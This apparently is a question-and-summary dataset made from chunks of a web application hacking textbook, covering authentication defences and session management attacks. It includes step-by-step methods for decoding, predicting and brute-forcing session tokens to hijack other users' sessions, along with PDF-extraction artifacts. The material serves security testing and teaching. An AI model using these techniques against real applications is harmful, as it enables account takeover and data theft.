Even\nproceeding directly to the password reset function is undesirable. The\nresponse to the account recovery challenge will in general be easier\nfor an attacker to guess than the original password, so it should not\nbe relied upon on its own to authenticate the user.\ncc0066..iinndddd 220000 88//1199//22001111 1122::0066::4422 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 201\nChapter 6 n Attacking Authentication 201\nLog, Monitor, and Notify\nn The application should log all authentication-related events, including\nlogin, logout, password change, password reset, account suspension, and\naccount recovery. Where applicable, both failed and successful attempts\nshould be logged. The logs should contain all relevant details (such as\nusername and IP address) but no security secrets (such as passwords).\nLogs should be strongly protected from unauthorized access, because\nthey are a critical source of information leakage.\nn Anomalies in authentication events should be processed by the appli-\ncation’s real-time alerting and intrusion prevention functionality. For\nexample, application administrators should be made aware of patterns\nindicating brute-force attacks so that appropriate defensive and offensive\nmeasures can be considered.\nn Users should be notifi ed out-of-band of any critical security events. For\nexample, the application should send a message to a user’s registered\ne-mail address whenever he changes his password.\nn Users should be notifi ed in-band of frequently occurring security events.\nFor example, after a successful login, the application should inform users of\nthe time and source IP/domain of the last login and the number of invalid\nlogin attempts made since then. If a user is made aware that her account\nis being subjected to a password-guessing attack, she is more likely to\nchange her password frequently and set it to a strong value.\nSummary\nAuthentication functions are perhaps the most prominent target in a typical\napplication’s attack surface. By defi nition, they can be reached by unprivileged,\nanonymous users. If broken, they grant access to protected functionality\nand sensitive data. They lie at the core of the security mechanisms that an\napplication employs to defend itself and are the front line of defense against\nunauthorized access.\nReal-world authentication mechanisms contain a myriad of design and imple-\nmentation fl aws. An effective assault against them needs to proceed systemati-\ncally, using a structured methodology to work through every possible avenue of\nattack. In many cases, open goals present themselves — bad passwords, ways to\nfi nd out usernames, vulnerability to brute-force attacks. At the other end of the\nspectrum, defects may be very hard to uncover. They may require meticulous\nexamination of a convoluted login process to establish the assumptions being\ncc0066..iinndddd 220011 88//1199//22001111 1122::0066::4422 PPMM\n\nStuttard c06.indd V3 - 07/22/2011 Page 202\n202 Chapter 6 n Attacking Authentication\nmade and to help you spot the subtle logic fl aw that can be exploited to walk\nright through the door.\nThe most important lesson when attacking authentication functionality is to\nlook everywhere. In addition to the main login form, there may be functions to\nregister new accounts, change passwords, remember passwords, recover forgotten\npasswords, and impersonate other users. Each of these presents a rich target of\npotential defects, and problems that have been consciously eliminated within\none function often reemerge within others. Invest the time to scrutinize and\nprobe every inch of attack surface you can fi nd, and your rewards may be great.\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. While testing a web application, you log in using your credentials of joe\nandpass. During the login process, you see a request for the following\nURL appear in your intercepting proxy:\nhttp://www.wahh-app.com/app?action=login&uname=joe&password=pass\nWhat three vulnerabilities can you diagnose without probing any further?\n2. How can self-registration functions introduce username enumeration\nvulnerabilities? How can these vulnerabilities be prevented?\n3. A login mechanism involves the following steps:\n(a) The application requests the user’s username and passcode.\n(b) The application requests two randomly chosen letters from the user’s\nmemorable word.\nWhy is the required information requested in two separate steps? What\ndefect would the mechanism contain if this were not the case?\n4. A multistage login mechanism fi rst requests the user’s username and\nthen various other items across successive stages. If any supplied item is\ninvalid, the user is immediately returned to the fi rst stage.\nWhat is wrong with this mechanism, and how can the vulnerability be\ncorrected?\n5. An application incorporates an antiphishing mechanism into its login\nfunctionality. During registration, each user selects a specifi c image from\na large bank of memorable images that the application presents to her.\nThe login function involves the following steps:\n(a) The user enters her username and date of birth.\ncc0066..iinndddd 220022 88//1199//22001111 1122::0066::4422 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 203\nChapter 6 n Attacking Authentication 203\n(b) If these details are correct, the application shows the user her chosen\nimage; otherwise, a random image is displayed.\n(c) The user verifi es whether the correct image is displayed. If it is, she\nenters her password.\nThe idea behind this antiphishing mechanism is that it enables the user\nto confi rm that she is dealing with the authentic application, not a clone,\nbecause only the real application knows the correct image to display to\nthe user.\nWhat vulnerability does this antiphishing mechanism introduce into the\nlogin function? Is the mechanism effective at preventing phishing?\ncc0066..iinndddd 220033 88//1199//22001111 1122::0066::4422 PPMM\nStuttard c06.indd V3 - 07/22/2011 Page 204\ncc0066..iinndddd 220044 88//1199//22001111 1122::0066::4422 PPMM",
    "question": "What are the key security risks associated with multistage login mechanisms and how can they be mitigated?",
    "summary": "Multistage login systems are not inherently more secure than standard username/password authentication and can be more prone to implementation flaws. Attackers can exploit weaknesses like bypassing stages, manipulating data, or using predictable questions to gain unauthorized access. Secure authentication requires careful handling of credentials, proper validation, and measures to prevent information leakage and brute-force attacks."
  },
  {
    "start": 166,
    "end": 175,
    "text": "Stuttard c07.indd V3 - 07/22/2011 Page 205\n\nCHAPTER\n7\nAttacking Session Management\nThe session management mechanism is a fundamental security component in\nthe majority of web applications. It is what enables the application to uniquely\nidentify a given user across a number of different requests and to handle\nthe data that it accumulates about the state of that user’s interaction with the\napplication. Where an application implements login functionality, session man-\nagement is of particular importance, because it is what enables the application\nto persist its assurance of any given user’s identity beyond the request in which\nhe supplies his credentials.\nBecause of the key role played by session management mechanisms, they\nare a prime target for malicious attacks against the application. If an attacker\ncan break an application’s session management, she can effectively bypass its\nauthentication controls and masquerade as other application users without\nknowing their credentials. If an attacker compromises an administrative user\nin this way, the attacker can own the entire application.\nAs with authentication mechanisms, a wide variety of defects can commonly\nbe found in session management functions. In the most vulnerable cases, an\nattacker simply needs to increment the value of a token issued to him by the\napplication to switch his context to that of a different user. In this situation,\nthe application is wide open for anyone to access all areas. At the other end\nof the spectrum, an attacker may have to work extremely hard, deciphering\nseveral layers of obfuscation and devising a sophisticated automated attack,\nbefore fi nding a chink in the application’s armor.\n205\ncc0077..iinndddd 220055 88//1199//22001111 1122::0077::3388 PPMM\n\nStuttard c07.indd V3 - 07/22/2011 Page 206\n206 Chapter 7 n Attacking Session Management\nThis chapter looks at all the types of weakness the authors have encountered\nin real-world web applications. It sets out in detail the practical steps you need\nto take to fi nd and exploit these defects. Finally, it describes the defensive mea-\nsures that applications should take to protect themselves against these attacks.\n\nCOMMON MYTH\n“We use smartcards for authentication, and users’ sessions cannot be com-\npromised without them.”\nHowever robust an application’s authentication mechanism, subsequent\nrequests from users are only linked back to that authentication via the result-\ning session. If the application’s session management is fl awed, an attacker\ncan bypass the robust authentication and still compromise users.\nThe Need for State\nThe HTTP protocol is essentially stateless. It is based on a simple request-response\nmodel, in which each pair of messages represents an independent transaction.\nThe protocol itself contains no mechanism for linking the series of requests\nmade by a particular user and distinguishing these from all the other requests\nreceived by the web server. In the early days of the Web, there was no need for\nany such mechanism: websites were used to publish static HTML pages for\nanyone to view. Today, things are very different.\nThe majority of web “sites” are in fact web applications. They allow you to\nregister and log in. They let you buy and sell goods. They remember your pref-\nerences the next time you visit. They deliver rich multimedia experiences with\ncontent created dynamically based on what you click and type. To implement\nany of this functionality, web applications need to use the concept of a session.\nThe most obvious use of sessions is in applications that support logging in.\nAfter entering your username and password, you can use the application as\nthe user whose credentials you have entered, until you log out or the session\nexpires due to inactivity. Without a session, a user would have to reenter his\npassword on every page of the application. Hence, after authenticating the user\nonce, the application creates a session for him and treats all requests belonging\nto that session as coming from that user.\nApplications that do not have a login function also typically need to use ses-\nsions. Many sites selling merchandise do not require customers to create accounts.\nHowever, they allow users to browse the catalog, add items to a shopping basket,\nprovide delivery details, and make a payment. In this scenario, there is no need\nto authenticate the user’s identity: for the majority of his visit, the application\ndoes not know or care who the user is. But to do business with him, it needs to\nknow which series of requests it receives originated from the same user.\ncc0077..iinndddd 220066 88//1199//22001111 1122::0077::3388 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 207\nChapter 7 n Attacking Session Management 207\nThe simplest and still most common means of implementing sessions is to\nissue each user a unique session token or identifi er. On each subsequent request\nto the application, the user resubmits this token, enabling the application to\ndetermine which sequence of earlier requests the current request relates to.\nIn most cases, applications use HTTP cookies as the transmission mechanism\nfor passing these session tokens between server and client. The server’s fi rst\nresponse to a new client contains an HTTP header like the following:\nSet-Cookie: ASP.NET_SessionId=mza2ji454s04cwbgwb2ttj55\nand subsequent requests from the client contain this header:\nCookie: ASP.NET_SessionId=mza2ji454s04cwbgwb2ttj55\nThis standard session management mechanism is inherently vulnerable to\nvarious categories of attack. An attacker’s primary objective in targeting the\nmechanism is to somehow hijack the session of a legitimate user and thereby\nmasquerade as that person. If the user has been authenticated to the application,\nthe attacker may be able to access private data belonging to the user or carry\nout unauthorized actions on that person’s behalf. If the user is unauthenticated,\nthe attacker may still be able to view sensitive information submitted by the\nuser during her session.\nAs in the previous example of a Microsoft IIS server running ASP.NET, most\ncommercial web servers and web application platforms implement their own\noff-the-shelf session management solution based on HTTP cookies. They provide\nAPIs that web application developers can use to integrate their own session-\ndependent functionality with this solution.\nSome off-the-shelf implementations of session management have been found to\nbe vulnerable to various attacks, which results in users’ sessions being compro-\nmised (these are discussed later in this chapter). In addition, some developers fi nd\nthat they need more fi ne-grained control over session behavior than is provided\nfor them by the built-in solutions, or they want to avoid some vulnerabilities\ninherent in cookie-based solutions. For these reasons, it is fairly common to see\nbespoke and/or non-cookie-based session management mechanisms used in\nsecurity-critical applications such as online banking.\nThe vulnerabilities that exist in session management mechanisms largely\nfall into two categories:\nn Weaknesses in the generation of session tokens\nn Weaknesses in the handling of session tokens throughout their life cycle\nWe will look at each of these areas in turn, describing the different types of\ndefects that are commonly found in real-world session management mecha-\nnisms, and practical techniques for discovering and exploiting these. Finally,\nwe will describe measures that applications can take to defend themselves\nagainst these attacks.\ncc0077..iinndddd 220077 88//1199//22001111 1122::0077::3388 PPMM\n\nStuttard c07.indd V3 - 07/22/2011 Page 208\n208 Chapter 7 n Attacking Session Management\n\nHACK STEPS\nIn many applications that use the standard cookie mechanism to transmit\nsession tokens, it is straightforward to identify which item of data contains\nthe token. However, in other cases this may require some detective work.\n1. The application may often employ several different items of data col-\nlectively as a token, including cookies, URL parameters, and hidden form\nfields. Some of these items may be used to maintain session state on dif-\nferent back-end components. Do not assume that a particular parameter\nis the session token without proving it, or that sessions are being tracked\nusing only one item.\n2. Sometimes, items that appear to be the application’s session token may\nnot be. In particular, the standard session cookie generated by the web\nserver or application platform may be present but not actually used by the\napplication.\n3. Observe which new items are passed to the browser after authentication.\nOften, new session tokens are created after a user authenticates herself.\n4. To verify which items are actually being employed as tokens, find a page\nthat is definitely session-dependent (such as a user-specific “my details”\npage). Make several requests for it, systematically removing each item\nthat you suspect is being used as a token. If removing an item causes\nthe session-dependent page not to be returned, this may confirm that the\nitem is a session token. Burp Repeater is a useful tool for performing\nthese tests.\nAlternatives to Sessions\nNot every web application employs sessions, and some security-critical applica-\ntions containing authentication mechanisms and complex functionality opt to\nuse other techniques to manage state. You are likely to encounter two possible\nalternatives:\nn HTTP authentication — Applications using the various HTTP-based\nauthentication technologies (basic, digest, NTLM) sometimes avoid the\nneed to use sessions. With HTTP authentication, the client component\ninteracts with the authentication mechanism directly via the browser,\nusing HTTP headers, and not via application-specifi c code contained\nwithin any individual page. After the user enters his credentials into a\nbrowser dialog, the browser effectively resubmits these credentials (or\nreperforms any required handshake) with every subsequent request to\nthe same server. This is equivalent to an application that uses HTML\nforms-based authentication and places a login form on every application\npage, requiring users to reauthenticate themselves with every action they\nperform. Hence, when HTTP-based authentication is used, it is possible\ncc0077..iinndddd 220088 88//1199//22001111 1122::0077::3388 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 209\nChapter 7 n Attacking Session Management 209\nfor an application to reidentify the user across multiple requests without\nusing sessions. However, HTTP authentication is rarely used on Internet-\nbased applications of any complexity, and the other versatile benefi ts\nthat fully fl edged session mechanisms offer mean that virtually all web\napplications do in fact employ these mechanisms.\nn Sessionless state mechanisms — Some applications do not issue session\ntokens to manage the state of a user’s interaction with the application.\nInstead, they transmit all data required to manage that state via the client,\nusually in a cookie or a hidden form fi eld. In effect, this mechanism uses\nsessionless state much like the ASP.NET ViewState does. For this type\nof mechanism to be secure, the data transmitted via the client must be\nproperly protected. This usually involves constructing a binary blob\ncontaining all the state information and encrypting or signing this using\na recognized algorithm. Suffi cient context must be included within the\ndata to prevent an attacker from collecting a state object at one location\nwithin the application and submitting it to another location to cause some\nundesirable behavior. The application may also include an expiration time\nwithin the object’s data to perform the equivalent of session timeouts.\nChapter 5 describes in more detail secure mechanisms for transmitting\ndata via the client.\n\nHACK STEPS\n1. If HTTP authentication is being used, it is possible that no session manage-\nment mechanism is implemented. Use the methods described previously to\nexamine the role played by any token-like items of data.\n2. If the application uses a sessionless state mechanism, transmitting all\ndata required to maintain state via the client, this may sometimes be\ndifficult to detect with certainty, but the following are strong indicators\nthat this kind of mechanism is being used:\nn Token-like data items issued to the client are fairly long (100 or more bytes).\nn The application issues a new token-like item in response to every request.\nn The data in the item appears to be encrypted (and therefore has no\ndiscernible structure) or signed (and therefore has a meaningful structure\naccompanied by a few bytes of meaningless binary data).\nn The application may reject attempts to submit the same item with more\nthan one request.\n3. If the evidence suggests strongly that the application is not using session\ntokens to manage state, it is unlikely that any of the attacks described in\nthis chapter will achieve anything. Your time probably would be better\nspent looking for other serious issues such as broken access controls or\ncode injection.\ncc0077..iinndddd 220099 88//1199//22001111 1122::0077::3399 PPMM\n\nStuttard c07.indd V3 - 07/22/2011 Page 210\n210 Chapter 7 n Attacking Session Management\nWeaknesses in Token Generation\nSession management mechanisms are often vulnerable to attack because tokens\nare generated in an unsafe manner that enables an attacker to identify the values\nof tokens that have been issued to other users.\nNOTE There are numerous locations where an application’s security\ndepends on the unpredictability of tokens it generates. Here are some\nexamples:\nn Password recovery tokens sent to the user’s registered e-mail address\nn Tokens placed in hidden form fi elds to prevent cross-site request forgery\nattacks (see Chapter 13)\nn Tokens used to give one-time access to protected resources\nn Persistent tokens used in “remember me” functions\nn Tokens allowing customers of a shopping application that does not use\nauthentication to retrieve the current status of an existing order\nThe considerations in this chapter relating to weaknesses in token generation\napply to all these cases. In fact, because many of today’s applications rely on\nmature platform mechanisms to generate session tokens, it is often in these\nother areas of functionality that exploitable weaknesses in token generation\nare found.\nMeaningful Tokens\nSome session tokens are created using a transformation of the user’s username\nor e-mail address, or other information associated with that person. This infor-\nmation may be encoded or obfuscated in some way and may be combined with\nother data.\nFor example, the following token may initially appear to be a long random\nstring:\n757365723d6461663b6170703d61646d696e3b646174653d30312f31322f3131\nHowever, on closer inspection, you can see that it contains only hexadecimal\ncharacters. Guessing that the string may actually be a hex encoding of a string\nof ASCII characters, you can run it through a decoder to reveal the following:\nuser=daf;app=admin;date=10/09/11\ncc0077..iinndddd 221100 88//1199//22001111 1122::0077::3399 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 211\nChapter 7 n Attacking Session Management 211\nAttackers can exploit the meaning within this session token to attempt to\nguess the current sessions of other application users. Using a list of enumerated\nor common usernames, they can quickly generate large numbers of potentially\nvalid tokens and test these to confi rm which are valid.\nTokens that contain meaningful data often exhibit a structure. In other words,\nthey contain several components, often separated by a delimiter, that can be\nextracted and analyzed separately to allow an attacker to understand their\nfunction and means of generation. Here are some components that may be\nencountered within structured tokens:\nn The account username\nn The numeric identifi er that the application uses to distinguish between\naccounts\nn The user’s fi rst and last names\nn The user’s e-mail address\nn The user’s group or role within the application\nn A date/time stamp\nn An incrementing or predictable number\nn The client IP address\nEach different component within a structured token, or indeed the entire\ntoken, may be encoded in different ways. This can be a deliberate measure to\nobfuscate their content, or it can simply ensure safe transport of binary data via\nHTTP. Encoding schemes that are commonly encountered include XOR, Base64,\nand hexadecimal representation using ASCII characters (see Chapter 3). It may\nbe necessary to test various decodings on each component of a structured token\nto unpack it to its original form.\nNOTE When an application handles a request containing a structured token,\nit may not actually process every component with the token or all the data\ncontained in each component. In the previous example, the application may\nBase64-decode the token and then process only the “user” and “date” com-\nponents. In cases where a token contains a blob of binary data, much of this\ndata may be padding. Only a small part of it may actually be relevant to the\nvalidation that the server performs on the token. Narrowing down the sub-\nparts of a token that are actually required can often considerably reduce the\namount of apparent entropy and complexity that the token contains.\ncc0077..iinndddd 221111 88//1199//22001111 1122::0077::3399 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 212\n212 Chapter 7 n Attacking Session Management\n\nHACK STEPS\n1. Obtain a single token from the application, and modify it in systematic\nways to determine whether the entire token is validated or whether some\nof its subcomponents are ignored. Try changing the token’s value one\nbyte at a time (or even one bit at a time) and resubmitting the modified\ntoken to the application to determine whether it is still accepted. If you\nfind that certain portions of the token are not actually required to be cor-\nrect, you can exclude these from any further analysis, potentially reducing\nthe amount of work you need to perform. You can use the “char frobber”\npayload type in Burp Intruder to modify a token’s value in one character\nposition at a time, to help with this task.\n2. Log in as several different users at different times, and record the tokens\nreceived from the server. If self-registration is available and you can choose\nyour username, log in with a series of similar usernames containing small\nvariations between them, such as A, AA, AAA, AAAA, AAAB, AAAC, AABA,\nand so on. If other user-specific data is submitted at login or stored in user\nprofiles (such as an e-mail address), perform a similar exercise to vary that\ndata systematically, and record the tokens received following login.\n3. Analyze the tokens for any correlations that appear to be related to the\nusername and other user-controllable data.\n4. Analyze the tokens for any detectable encoding or obfuscation. Where the\nusername contains a sequence of the same character, look for a correspond-\ning character sequence in the token, which may indicate the use of XOR\nobfuscation. Look for sequences in the token containing only hexadecimal\ncharacters, which may indicate a hex encoding of an ASCII string or other\ninformation. Look for sequences that end in an equals sign and/or that con-\ntain only the other valid Base64 characters: a to z, A to Z, 0 to 9, +, and /.\n5. If any meaning can be reverse-engineered from the sample of session\ntokens, consider whether you have sufficient information to attempt to\nguess the tokens recently issued to other application users. Find a page\nof the application that is session-dependent, such as one that returns an\nerror message or a redirect elsewhere if accessed without a valid session.\nThen use a tool such as Burp Intruder to make large numbers of requests\nto this page using guessed tokens. Monitor the results for any cases in\nwhich the page is loaded correctly, indicating a valid session token.\nTRY IT!\nhttp://mdsec.net/auth/321/\nhttp://mdsec.net/auth/329/\nhttp://mdsec.net/auth/331/\ncc0077..iinndddd 221122 88//1199//22001111 1122::0077::3399 PPMM\n\nStuttard c07.indd V3 - 07/22/2011 Page 213\nChapter 7 n Attacking Session Management 213\nPredictable Tokens\nSome session tokens do not contain any meaningful data associating them\nwith a particular user. Nevertheless, they can be guessed because they contain\nsequences or patterns that allow an attacker to extrapolate from a sample of\ntokens to fi nd other valid tokens recently issued by the application. Even if the\nextrapolation involves some trial and error (for example, one valid guess per\n1,000 attempts), this would still enable an automated attack to identify large\nnumbers of valid tokens in a relatively short period of time.\nVulnerabilities relating to predictable token generation may be much easier to\ndiscover in commercial implementations of session management, such as web\nservers or web application platforms, than they are in bespoke applications.\nWhen you are remotely targeting a bespoke session management mechanism,\nyour sample of issued tokens may be restricted by the server’s capacity, the\nactivity of other users, your bandwidth, network latency, and so on. In a labora-\ntory environment, however, you can quickly create millions of sample tokens,\nall precisely sequenced and time-stamped, and you can eliminate interference\ncaused by other users.\nIn the simplest and most brazenly vulnerable cases, an application may use\na simple sequential number as the session token. In this case, you only need\nto obtain a sample of two or three tokens before launching an attack that will\nquickly capture 100% of currently valid sessions.\nFigure 7-1 shows Burp Intruder being used to cycle the last two digits of a\nsequential session token to fi nd values where the session is still active and can\nbe hijacked. Here, the length of the server’s response is a reliable indicator that\na valid session has been found. The extract grep feature has also been used to\nshow the name of the logged-in user for each session.\nIn other cases, an application’s tokens may contain more elaborate sequences\nthat take some effort to discover. The types of potential variations you might\nencounter here are open-ended, but the authors’ experience in the fi eld indicates\nthat predictable session tokens commonly arise from three different sources:\nn Concealed sequences\nn Time dependency\nn Weak random number generation\nWe will look at each of these areas in turn.\nConcealed Sequences\nIt is common to encounter session tokens that cannot be easily predicted when\nanalyzed in their raw form but that contain sequences that reveal themselves\nwhen the tokens are suitably decoded or unpacked.\ncc0077..iinndddd 221133 88//1199//22001111 1122::0077::3399 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 214\n214 Chapter 7 n Attacking Session Management\nFigure 7-1: An attack to discover valid sessions where the session token is\npredictable\nConsider the following series of values, which form one component of a\nstructured session token:\nlwjVJA\nLs3Ajg\nxpKr+A\nXleXYg\n9hyCzA\njeFuNg\nJaZZoA\nNo immediate pattern is discernible; however, a cursory inspection indicates\nthat the tokens may contain Base64-encoded data. In addition to the mixed-case\nalphabetic and numeric characters, there is a + character, which is also valid in\na Base64-encoded string. Running the tokens through a Base64 decoder reveals\nthe following:\n--Õ$\n.ÍÀŽ\nÆ’«ø\n^W-b\nö‚Ì\n?án6\n%¦Y\ncc0077..iinndddd 221144 88//1199//22001111 1122::0077::3399 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 215\nChapter 7 n Attacking Session Management 215\nThese strings appear to be gibberish and also contain nonprinting characters. This\nnormally indicates that you are dealing with binary data rather than ASCII text.\nRendering the decoded data as hexadecimal numbers gives you the following:\n9708D524\n2ECDC08E\n\nC692ABF8\n5E579762\n\nF61C82CC\n8DE16E36\n25A659A0\nThere is still no visible pattern. However, if you subtract each number from the\nprevious one, you arrive at the following:\n\nFF97C4EB6A\n97C4EB6A\n\nFF97C4EB6A\n97C4EB6A\n\nFF97C4EB6A",
    "question": "What are the two main categories of vulnerabilities in session management mechanisms, and how can attackers exploit them?",
    "summary": "Session management is a critical security component in web applications, enabling the system to track user interactions and maintain authentication. Weaknesses in session tokens can allow attackers to bypass authentication and impersonate users. This chapter discusses common vulnerabilities in session token generation and handling, as well as methods for identifying and exploiting them, and defensive measures to protect against such attacks."
  },
  {
    "start": 176,
    "end": 201,
    "text": "FF97C4EB6A\nwhich immediately reveals the concealed pattern. The algorithm used to generate\ntokens adds 0x97C4EB6A to the previous value, truncates the result to a 32-bit\nnumber, and Base64-encodes this binary data to allow it to be transported using\nthe text-based protocol HTTP. Using this knowledge, you can easily write a\nscript to produce the series of tokens that the server will next produce, and the\nseries that it produced prior to the captured sample. Time Dependency\nSome web servers and applications employ algorithms to generate session tokens\nthat use the time of generation as an input to the token’s value. If insuffi cient\nother entropy is incorporated into the algorithm, you may be able to predict\nother users’ tokens. Although any given sequence of tokens on its own may\nappear to be random, the same sequence coupled with information about the\ntime at which each token was generated may contain a discernible pattern. In a\nbusy application with a large number of sessions being created each second, a\nscripted attack may succeed in identifying large numbers of other users’ tokens. When testing the web application of an online retailer, the authors encoun-\ntered the following sequence of session tokens:\n3124538-1172764258718\n3124539-1172764259062\n3124540-1172764259281\n3124541-1172764259734\n3124542-1172764260046\n3124543-1172764260156\ncc0077..iinndddd 221155 88//1199//22001111 1122::0077::3399 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 216\n216 Chapter 7 n Attacking Session Management\n3124544-1172764260296\n3124545-1172764260421\n3124546-1172764260812\n3124547-1172764260890\nEach token is clearly composed of two separate numeric components. The\nfi rst number follows a simple incrementing sequence and is easy to predict. The second number increases by a varying amount each time. Calculating the\ndifferences between its value in each successive token reveals the following:\n344\n219\n453\n312\n110\n140\n125\n391\n78\nThe sequence does not appear to contain a reliably predictable pattern. However,\nit would clearly be possible to brute-force the relevant number range in an auto-\nmated attack to discover valid values in the sequence. Before attempting this\nattack, however, we wait a few minutes and gather a further sequence of tokens:\n3124553-1172764800468\n3124554-1172764800609\n3124555-1172764801109\n3124556-1172764801406\n3124557-1172764801703\n3124558-1172764802125\n3124559-1172764802500\n3124560-1172764802656\n3124561-1172764803125\n3124562-1172764803562\nComparing this second sequence of tokens with the fi rst, two points are imme-\ndiately obvious:\nn The fi rst numeric sequence continues to progress incrementally; however,\nfi ve values have been skipped since the end of the fi rst sequence. This is\npresumably because the missing values have been issued to other users\nwho logged in to the application in the window between the two tests. n The second numeric sequence continues to progress by similar intervals\nas before; however, the fi rst value we obtain is a massive 539,578 greater\nthan the previous value. cc0077..iinndddd 221166 88//1199//22001111 1122::0077::3399 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 217\nChapter 7 n Attacking Session Management 217\nThis second observation immediately alerts us to the role played by time\nin generating session tokens. Apparently, only fi ve tokens have been issued\nbetween the two token-grabbing exercises. However, a period of approximately\n10 minutes has elapsed. The most likely explanation is that the second number\nis time-dependent and is probably a simple count of milliseconds. Indeed, our hunch is correct. In a subsequent phase of our testing we perform\na code review, which reveals the following token-generation algorithm:\nString sessId = Integer.toString(s_SessionIndex++) +\n“-” +\nSystem.currentTimeMillis();\nGiven our analysis of how tokens are created, it is straightforward to con-\nstruct a scripted attack to harvest the session tokens that the application issues\nto other users:\nn We continue polling the server to obtain new session tokens in quick\nsuccession. n We monitor the increments in the fi rst number. When this increases by\nmore than 1, we know that a token has been issued to another user. n When a token has been issued to another user, we know the upper and\nlower bounds of the second number that was issued to that person, because\nwe possess the tokens that were issued immediately before and after\nhis. Because we are obtaining new session tokens frequently, the range\nbetween these bounds will typically consist of only a few hundred values. n Each time a token is issued to another user, we launch a brute-force attack\nto iterate through each number in the range, appending this to the miss-\ning incremental number that we know was issued to the other user. We\nattempt to access a protected page using each token we construct, until\nthe attempt succeeds and we have compromised the user’s session. n Running this scripted attack continuously will enable us to capture the\nsession token of every other application user. When an administrative\nuser logs in, we will fully compromise the entire application. TRY IT! http://mdsec.net/auth/339/\nhttp://mdsec.net/auth/340/\nhttp://mdsec.net/auth/347/\nhttp://mdsec.net/auth/351/\ncc0077..iinndddd 221177 88//1199//22001111 1122::0077::4400 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 218\n218 Chapter 7 n Attacking Session Management\nWeak Random Number Generation\nVery little that occurs inside a computer is random. Therefore, when random-\nness is required for some purpose, software uses various techniques to generate\nnumbers in a pseudorandom manner. Some of the algorithms used produce\nsequences that appear to be stochastic and manifest an even spread across the\nrange of possible values. Nevertheless, they can be extrapolated forwards or\nbackwards with perfect accuracy by anyone who obtains a small sample of values. When a predictable pseudorandom number generator is used to produce\nsession tokens, the resulting tokens are vulnerable to sequencing by an attacker. Jetty is a popular web server written in 100% Java that provides a session\nmanagement mechanism for use by applications running on it. In 2006, Chris\nAnley of NGSSoftware discovered that the mechanism was vulnerable to a\nsession token prediction attack. The server used the Java API java.util.Random\nto generate session tokens. This implements a “linear congruential generator,”\nwhich generates the next number in the sequence as follows:\nsynchronized protected int next(int bits) {\nseed = (seed * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1);\nreturn (int)(seed >>> (48 - bits));\n}\nThis algorithm takes the last number generated, multiplies it by a constant,\nand adds another constant to obtain the next number. The number is truncated\nto 48 bits, and the algorithm shifts the result to return the specifi c number of\nbits requested by the caller. Knowing this algorithm and a single number generated by it, we can easily\nderive the sequence of numbers that the algorithm will generate next. With a\nlittle number theory, we also can derive the sequence that it generated previ-\nously. This means that an attacker who obtains a single session token from the\nserver can obtain the tokens of all current and future sessions. NOTE Sometimes when tokens are created based on the output of a pseu-\ndorandom number generator, developers decide to construct each token by\nconcatenating several sequential outputs from the generator. The perceived\nrationale for this is that it creates a longer, and therefore “stronger,” token. However, this tactic is usually a mistake. If an attacker can obtain several\nconsecutive outputs from the generator, this may enable him to infer some\ninformation about its internal state. In fact, it may be easier for the attacker to\nextrapolate the generator’s sequence of outputs, either forward or backward. Other off-the-shelf application frameworks use surprisingly simple or predict-\nable sources of entropy in session token generation, much of which is deterministic. For example, in PHP frameworks 5.3.2 and earlier, the session token is generated\ncc0077..iinndddd 221188 88//1199//22001111 1122::0077::4400 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 219\nChapter 7 n Attacking Session Management 219\nbased on the client’s IP address, epoch time at token creation, microseconds at\ntoken creation, and a linear congruential generator. Although there are several\nunknown values here, some applications may disclose information that allows\nthem to be inferred. A social networking site may disclose the login time and\nIP address of site users. Additionally, the seed used in this generator is the time\nwhen the PHP process started, which could be determined to lie within a small\nrange of values if the attacker is monitoring the server. NOTE This is an evolving area of research. The weaknesses in PHP’s session\ntoken generation were pointed out on the Full Disclosure mailing list in 2001\nbut were not demonstrated to be actually exploitable. The 2001 theory was\nfi nally put into practice by Samy Kamkar with the phpwn tool in 2010. Testing the Quality of Randomness\nIn some cases, you can identify patterns in a series of tokens just from visual\ninspection, or from a modest amount of manual analysis. In general, however,\nyou need to use a more rigorous approach to testing the quality of randomness\nwithin an application’s tokens. The standard approach to this task applies the principles of statistical hypoth-\nesis testing and employs various well-documented tests that look for evidence of\nnonrandomness within a sample of tokens. The high-level steps in this process\nare as follows:\n1. Start with the hypothesis that the tokens are randomly generated. 2. Apply a series of tests, each of which observes specifi c properties of the\nsample that are likely to have certain characteristics if the tokens are\nrandomly generated. 3. For each test, calculate the probability of the observed characteristics\noccurring, working on the assumption that the hypothesis is true. 4. If this probability falls below a certain level (the “signifi cance level”), reject\nthe hypothesis and conclude that the tokens are not randomly generated. The good news is you don’t have to do any of this manually! The best tool\nthat is currently available for testing the randomness of web application tokens\nis Burp Sequencer. This tool applies several standard tests in a fl exible way and\ngives you clear results that are easy to interpret. To use Burp Sequencer, you need to fi nd a response from the application\nthat issues the token you want to test, such as a response to a login request that\nissues a new cookie containing a session token. Select the “send to sequencer”\noption from Burp’s context menu, and in the Sequencer confi guration, set the\nlocation of the token within the response, as shown in Figure 7-2.\n\nYou can also\ncc0077..iinndddd 221199 88//1199//22001111 1122::0077::4400 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 220\n220 Chapter 7 n Attacking Session Management\nconfi gure various options that affect how tokens are collected, and then click\nthe start capture button to begin capturing tokens. If you have already obtained\na suitable sample of tokens through other means (for example, by saving the\nresults of a Burp Intruder attack), you can use the manual load tab to skip the\ncapturing of tokens and proceed straight to the statistical analysis. Figure 7-2: Configuring Burp Sequencer to test the randomness of a session token\nWhen you have obtained a suitable sample of tokens, you can perform the\nstatistical analysis on the sample. You can also perform interim analyses while\nthe sample is still being captured. In general, obtaining a larger sample improves\nthe reliability of the analysis. The minimum sample size that Burp requires is\n100 tokens, but ideally you should obtain a much larger sample than this. If the\nanalysis of a few hundred tokens shows conclusively that the tokens fail the\nrandomness tests, you may reasonably decide that it is 